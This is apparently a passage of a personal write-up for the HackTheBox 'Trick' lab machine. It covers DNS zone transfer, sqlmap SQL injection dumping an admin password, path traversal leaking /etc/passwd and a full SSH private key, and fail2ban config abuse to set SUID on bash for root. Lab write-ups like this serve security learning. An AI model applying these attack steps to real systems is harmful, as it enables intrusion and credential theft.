+  
+  
+    <li class="md-nav__item">
+      <a href="../27017-27018-mongodb/" class="md-nav__link">
+        27018 mongodb
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8" tabindex="0" aria-expanded="false">
+          Pentesting mobile
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Pentesting mobile" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Pentesting mobile
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../setting-up-mobile-penstesting/" class="md-nav__link">
+        Setting up the mobile pentesting environment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../todolist/" class="md-nav__link">
+        To-do list
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+    <nav class="md-nav" aria-label="About the machine">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-port-enumeration" class="md-nav__link">
+    Service/ Port enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration" class="md-nav__link">
+    Directory enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns-enumeration" class="md-nav__link">
+    dns enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-etchosts-file" class="md-nav__link">
+    Edit /etc/hosts file
+  </a>
+  
+    <nav class="md-nav" aria-label="Edit /etc/hosts file">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration_1" class="md-nav__link">
+    Directory enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-a-sql-injection-vulnerability" class="md-nav__link">
+    Exploiting a sql injection vulnerability
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting a sql injection vulnerability">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns-fuzzing" class="md-nav__link">
+    DNS fuzzing
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#edit-etchosts-file_1" class="md-nav__link">
+    Edit /etc/hosts file
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escalation-of-privileges" class="md-nav__link">
+    Escalation of privileges
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+
+  <h1>trick</h1>
+
+<h2 id="about-the-machine">About the machine</h2>
+<p><img alt="Trick Machine Banner" src="../img/trick.png" /></p>
+<table>
+<thead>
+<tr>
+<th>data</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine</td>
+<td>Trick</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>Hackthebox</td>
+</tr>
+<tr>
+<td>url</td>
+<td><a href="https://app.hackthebox.com/machines/Trick">link</a></td>
+</tr>
+<tr>
+<td>creator</td>
+<td><a href="https://app.hackthebox.com/users/184611">Geiseric</a></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+<tr>
+<td>Release data</td>
+<td>18 June 2022</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Points</td>
+<td>20</td>
+</tr>
+<tr>
+<td>ip</td>
+<td>10.10.11.166</td>
+</tr>
+</tbody>
+</table>
+<h3 id="recon">Recon</h3>
+<p>First, we run:</p>
+<pre><code class="language-bash">export ip=10.10.11.166
+</code></pre>
+<h4 id="service-port-enumeration">Service/ Port enumeration</h4>
+<p>Run nmap to enumerate open ports, services, OS and traceroute</p>
+<p>General enumeration not to make too much noise:</p>
+<pre><code class="language-bash">sudo nmap $ip -Pn
+</code></pre>
+<p>Results:</p>
+<pre><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:31 EDT
+Nmap scan report for trick.htb (10.10.11.166)
+Host is up (0.15s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+25/tcp open  smtp
+53/tcp open  domain
+80/tcp open  http
+</code></pre>
+<p>Once you know open ports, run nmap to see service versions and more details:   </p>
+<pre><code class="language-bash">nmap -sCV -p22,80,53,25 -oN targeted $ip
+</code></pre>
+<p>Results:</p>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid:
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+|_http-server-header: nginx/1.14.2
+Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h4 id="directory-enumeration">Directory enumeration</h4>
+<p>We can use gobuster to enumerate directories:</p>
+<pre><code class="language-bash">gobuster dir -u $ip -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<h4 id="dns-enumeration">dns enumeration</h4>
+<p>Run:</p>
+<pre><code class="language-bash">dnslookup
+</code></pre>
+<p>And after that:</p>
+<pre><code>&gt; SERVER 10.10.11.166
+</code></pre>
+<p>Results:</p>
+<pre><code>Default server: 10.10.11.166
+Address: 10.10.11.166#53
+</code></pre>
+<p>Then, we run:</p>
+<pre><code>&gt; 10.10.11.166
+</code></pre>
+<p>And as a result, we have:</p>
+<pre><code>166.11.10.10.in-addr.arpa       name = trick.htb.
+</code></pre>
+<p>Now we have a dns name: trick.htb. We can dig it with:</p>
+<pre><code class="language-bash">dig trick.htb axfr @10.10.11.166
+</code></pre>
+<p>And the results:</p>
+<pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.6-2-Debian &lt;&lt;&gt;&gt; trick.htb axfr @10.10.11.166
+;; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 96 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
+;; WHEN: Wed Oct 19 13:20:24 EDT 2022
+;; XFR size: 6 records (messages 1, bytes 231)
+</code></pre>
+<p>Finally we have these dns domains:
++ trick.htb
++ preprod-payroll.trick.htb
++ root.trick.htb</p>
+<h3 id="edit-etchosts-file">Edit /etc/hosts file</h3>
+<p>We add the given subdomain to our /etc/hosts file.
+First we open the /etc/hosts file with an editor. For instance, nano.</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>We move the cursor to the end and we add these lines:</p>
+<pre><code>10.10.11.166    trick.htb
+10.10.11.166    preprod-payroll.trick.htb
+10.10.11.166    root.trick.htb
+</code></pre>
+<p>Now we can use the browser to go to: http://preprod-payroll.trick.htb</p>
+<p>And start again with directory enumeration.</p>
+<h4 id="directory-enumeration_1">Directory enumeration</h4>
+<p>Run the dictionary:</p>
+<pre><code class="language-bash">gobuster dir -u http://preprod-payroll.trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<p>Results:</p>
+<pre><code>Dirs found with a 302 response:
+
+/
+
+Dirs found with a 403 response:
+
+/assets/
+/database/
+/assets/vendor/
+/assets/img/
+/assets/vendor/jquery/
+/assets/DataTables/
+/assets/vendor/bootstrap/
+/assets/vendor/bootstrap/js/
+/assets/vendor/jquery.easing/
+/assets/css/
+/assets/vendor/php-email-form/
+/assets/vendor/venobox/
+/assets/vendor/waypoints/
+/assets/vendor/counterup/
+/assets/vendor/owl.carousel/
+/assets/vendor/bootstrap-datepicker/
+/assets/vendor/bootstrap-datepicker/js/
+/assets/js/
+/assets/font-awesome/
+/assets/font-awesome/js/
+/assets/vendor/owl.carousel/assets/
+/assets/vendor/bootstrap/css/
+/assets/vendor/bootstrap-datepicker/css/
+/assets/font-awesome/css/
+/assets/vendor/bootstrap-datepicker/locales/
+/assets/font-awesome/less/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 302 responce:
+
+/index.php
+
+Files found with a 200 responce:
+
+/login.php
+/home.php
+/header.php
+/users.php
+/ajax.php
+/navbar.php
+/assets/vendor/jquery/jquery.min.js
+/assets/DataTables/datatables.min.js
+/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
+/assets/vendor/jquery.easing/jquery.easing.min.js
+/assets/vendor/php-email-form/validate.js
+/assets/vendor/venobox/venobox.min.js
+/assets/vendor/waypoints/jquery.waypoints.min.js
+/assets/vendor/counterup/counterup.min.js
+/assets/vendor/owl.carousel/owl.carousel.min.js
+/assets/js/select2.min.js
+/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.min.js
+/assets/js/jquery.datetimepicker.full.min.js
+/assets/js/jquery-te-1.4.0.min.js
+/assets/font-awesome/js/all.min.js
+/department.php
+/topbar.php
+/position.php
+/employee.php
+/payroll.php
+</code></pre>
+<p>In http://preprod-payroll.trick.htb/users.php there is this info:</p>
+<pre><code>name: Administrator
+username: Enemigosss
+</code></pre>
+<h3 id="exploiting-a-sql-injection-vulnerability">Exploiting a sql injection vulnerability</h3>
+<p>If we have a look at the forms at http://preprod-payroll.trick.htb/login.php and run sqlmap, we'll see that it is vulnerable to SQL injection - Blind.</p>
+<p>We can extract databases:</p>
+<pre><code class="language-bash">sqlmap -r login --dbs
+</code></pre>
+<p>Results:</p>
+<pre><code>available databases [2]:
+[*] information_schema
+[*] payroll_db
+</code></pre>
+<p>Now, we extract tables from payroll_db database:</p>
+<pre><code class="language-bash">sqlmap -r login -D payroll_db --tables
+</code></pre>
+<p>Results:</p>
+<pre><code>Database: payroll_db
+[11 tables]
++---------------------+
+| position            |
+| allowances          |
+| attendance          |
+| deductions          |
+| department          |
+| employee            |
+| employee_allowances |
+| employee_deductions |
+| payroll             |
+| payroll_items       |
+| users               |
++---------------------+
+</code></pre>
+<p>Next, we get columns from the users table:</p>
+<pre><code class="language-bash">sqlmap -r login -D payroll_db -T users --columns
+</code></pre>
+<p>Results:</p>
+<pre><code>Database: payroll_db
+Table: users
+[8 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| address   | text         |
+| contact   | text         |
+| doctor_id | int(30)      |
+| id        | int(30)      |
+| name      | varchar(200) |
+| password  | varchar(200) |
+| type      | tinyint(1)   |
+| username  | varchar(100) |
++-----------+--------------+
+</code></pre>
+<p>And finally we can get usernames and passwords:</p>
+<pre><code class="language-bash">sqlmap -r login -D payroll_db -T users -C username,password --dump
+</code></pre>
+<p>Results:</p>
+<pre><code>Database: payroll_db
+Table: users
+[1 entry]
++------------+-----------------------+
+| username   | password              |
++------------+-----------------------+
+| Enemigosss | SuperGucciRainbowCake |
++------------+-----------------------+
+</code></pre>
+<p>We can login at http://preprod-payroll.trick.htb and see an administration pannel, but other than information disclosure, we cannot find a vuln to get into the server.</p>
+<h4 id="dns-fuzzing">DNS fuzzing</h4>
+<p>Since the subdomain name (http://preprod-payroll.trick.htb/) looks interesting as “payroll” can be replaced with another word, we can consider fuzzing it. Firstly, we will need to figure out the non-existence subdomain query’s error response size. Then we fuzz for a subdomain.</p>
+<pre><code class="language-bash">curl -s -H &quot;Host: nonexistent.trick.htb&quot; https://trick.htb | wc -c
+</code></pre>
+<p>And it returns 5480, which is the filter that we will use in th ffuz command.</p>
+<p>Now we can keep on enumerating subdomains with ffuz:</p>
+<pre><code class="language-bash">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt -u http://trick.htb -H “Host: FUZZ.trick.htb” -fs 5480
+</code></pre>
+<p>If we add -fs 5480 to the command this will filter out the responses that are 5480 bytes in length (which are non-existent subdomains) and we can pinpoint what is a real finding.</p>
+<pre><code class="language-bash">ffuf -H &quot;Host: preprod-FUZZ.trick.htb&quot; -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.166 -fs 5480
+</code></pre>
+<p>Adding the filter reveals a new subdomain called preprod-marketing. Results:</p>
+<pre><code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.166
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: preprod-FUZZ.trick.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 5480
+________________________________________________
+
+marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 267ms]
+pc169                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
+payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 116ms]
+77msccom                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms
+</code></pre>
+<h3 id="edit-etchosts-file_1">Edit /etc/hosts file</h3>
+<p>We add the given subdomain to our /etc/hosts file.
+First we open the /etc/hosts file with an editor. For instance, nano.</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>We move the cursor to the end and we add these lines:</p>
+<pre><code>10.10.11.166    preprod-marketing.trick.htb
+</code></pre>
+<p>We introduce the address into the browser and we can see a website. In one of the pages there is a path traversal vulnerability:</p>
+<pre><code>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd
+</code></pre>
+<p>Results:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
+postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
+bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
+michael:x:1001:1001::/home/michael:/bin/bash
+</code></pre>
+<p>Now, we can infer somehow that in /home/michael we can find a .ssh folder with teh id_rsa public ssh signature. To download it, we can use burp and capture this petition:</p>
+<pre><code>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa
+</code></pre>
+<p>As a result, we can download michael's public key to login via ssh:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.14.2
+Date: Thu, 20 Oct 2022 08:25:41 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Content-Length: 1823
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
++93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Now we save it with the name we want and change its permissions:</p>
+<pre><code class="language-bash">nano key
+# CTRl-MAY V to paste it
+# CTRL-X, Yes and ENTER to save the buffer and exit
+sudo chmod 400 key
+</code></pre>
+<p>And we can login as michael:</p>
+<pre><code class="language-bash">ssh -i key michael@10.10.11.166
+</code></pre>
+<p>In /home/michael we have the user flag: user.txt.</p>
+<h3 id="escalation-of-privileges">Escalation of privileges</h3>
+<p>Getting the system flag.
+Check michael's groups:</p>
+<pre><code class="language-bash">id
+</code></pre>
+<p>Results:</p>
+<pre><code>uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
+</code></pre>
+<p>Check michael's permissions:</p>
+<pre><code class="language-bash">sudo -l
+</code></pre>
+<p>Results:</p>
+<pre><code>Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+</code></pre>
+<p>Interesting part here is that michael may run fail2ban command as root without any password. This is due to a misconfiguration and we can exploit it.</p>
+<p>For starters, michael has writing permissions over the configuration files located in /etc/fail2ban/action.d</p>
+<p>Run:</p>
+<pre><code class="language-bash">ls -la /etc/fail2ban
+</code></pre>
+<p>And we can see michael, as part of the security group has rwx rights on the directory owned by root:</p>
+<pre><code>...
+drwxrwx---   2 root security  4096 Oct 20 11:03 action.d
+...
+</code></pre>
+<p>Now we need to understand what fail2ban is and how it works. fail2ban is a great IDPS tool, not only it can detect attacks but also block malicious IP addresses by using Linux iptables. Although fail2ban can be used for services like HTTP, SMTP, IMAP, etc. most sys-admins use it to protect the SSH service. fail2ban daemon reads the log files and if there is a malicious pattern detected (e.g multiple failed login requests) it executes a command for blocking the IP for a certain period of time or maybe forever.</p>
+<p>In the file /etc/fail2ban/jail.conf, we can spot some customizations such as ban time and maxretry:</p>
+<pre><code class="language-bash">cat /etc/fail2ban/jail.conf
+</code></pre>
+<p>And we see that bantime is limited to 10 seconds and maximum of retries to 5:</p>
+<pre><code># &quot;bantime&quot; is the number of seconds that a host is banned.
+bantime  = 10s
+
+# A host is banned if it has generated &quot;maxretry&quot; during the last &quot;findtime&quot;
+# seconds.
+findtime  = 10s
+
+# &quot;maxretry&quot; is the number of failures before a host gets banned.
+maxretry = 5
+</code></pre>
+<p>This means that if we retry ssh connection six times (so we exceed the maxretry parameter), the file  /etc/fail2ban/action.d/iptables-multiport.conf will be executed as root, and as a consequence, our host will be banned. Now, as part of the security group michael does have rwx permissions on the parent folder /etc/fail2ban/action.d, but not on the file /etc/fail2ban/action.d/iptables-multiport.conf:</p>
+<pre><code class="language-bash">ls -la /etc/fail2ban/action.d/iptables-multiport.conf
+</code></pre>
+<p>Result:</p>
+<pre><code>-rw-r--r-- 1 root root 1420 Oct 20 12:48 iptables-multiport.conf
+</code></pre>
+<p>We need then, to be able to edit that file to include our malicious code. As the service fail2ban is restarted every minute or so, you need to execute the following commands quickly. They will allow you to overwrite the file /etc/fail2ban/action.d/iptables-multiport.conf:</p>
+<pre><code class="language-bash"># create a copy of the file to have rwx permissions
+mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+# overwrite the existing file with your copy
+cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
+# edit the file and add your lines
+nano /etc/fail2ban/action.d/iptables-multiport.conf
+# In the file, comment the line with the  actionban definition and
+# add:
+# actionban = chmod +s /bin/bash
+# Also in the file, comment the line with the  actionunban definition and
+# add:
+# actionunban = chmod +s /bin/bash
+# CTRL-X -   Yes and ENTER to save changes.
+</code></pre>
+<p>With "chmod +s /bin/bash" we're going to give the suid bit to bash. The suid bit provides the user running it the same privileges that the user who created it. In this case, root is the user who created it. If we run it, we'll have root privileges during its execution.
+The next step is restarting the service to get the file iptables-multiport.conf updated.</p>
+<pre><code class="language-bash">sudo /etc/init.d/fail2ban restart
+</code></pre>
+<p>Now, when we fail to login into the system with ssh more than 5 times, the configuration set in iptables-multiport.conf will take place. For that, from the attacker command line:</p>
+<ol>
+<li>We install sshpass, a program that allows us to pass passwords in the command line to ssh. This way we can automate the login process:</li>
+</ol>
+<pre><code class="language-bash">sudo apt install sshpass
+</code></pre>
+<ol>
+<li>Write a script in the attacker machine:</li>
+</ol>
+<pre><code class="language-bash">nano wronglogin.sh
+</code></pre>
+<pre><code class="language-bash">#!/bin/bash
+
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+sshpass -p &quot;wrongpassword&quot; ssh michael@10.10.11.166
+</code></pre>
+<p>Add execution permission:</p>
+<pre><code class="language-bash">chmod +x wronglongin.sh
+</code></pre>
+<ol>
+<li>Launch the script:</li>
+</ol>
+<pre><code class="language-bash">./wronglogin.sh
+</code></pre>
+<p>Once the script is executed, the suid bit will be activated for bash. Run:</p>
+<pre><code class="language-bash"> ls -l /bin/bash
+</code></pre>
+<p>And you will see:</p>
+<pre><code>-rwsr-sr-x 1 root root 1168776 Oct 20  2022 /bin/bash
+</code></pre>
+<p>Now if we run:</p>
+<pre><code class="language-bash">bash -p
+</code></pre>
+<p>The -p flag turns on privileged mode.  In this mode, the <code>$BASH_ENV' and '$ENV' files are not processed, shell functions are not inherited from the environment, and the</code>SHELLOPTS', 'BASHOPTS', 'CDPATH' and 'GLOBIGNORE' variables, if they appear in the environment, are ignored. The result:</p>
+<pre><code>michael@trick:~$ bash -p
+bash-5.0# id
+uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security)
+bash-5.0# cd /root
+bash-5.0# ls
+f2b.sh  fail2ban  root.txt  set_dns.sh
+</code></pre>
+<p>To display the system flag:</p>
+<pre><code class="language-bash">cat root.txt
+</code></pre>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
